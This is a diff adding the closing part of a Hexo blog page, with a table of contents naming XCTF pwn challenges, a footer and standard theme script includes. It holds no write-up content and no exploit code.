+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XCTF（攻防世界）"><span class="nav-text">XCTF（攻防世界）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2"><span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#when-did-you-born"><span class="nav-text">when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-pwn"><span class="nav-text">hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CGfsb"><span class="nav-text">CGfsb</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caiii-vegtable</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
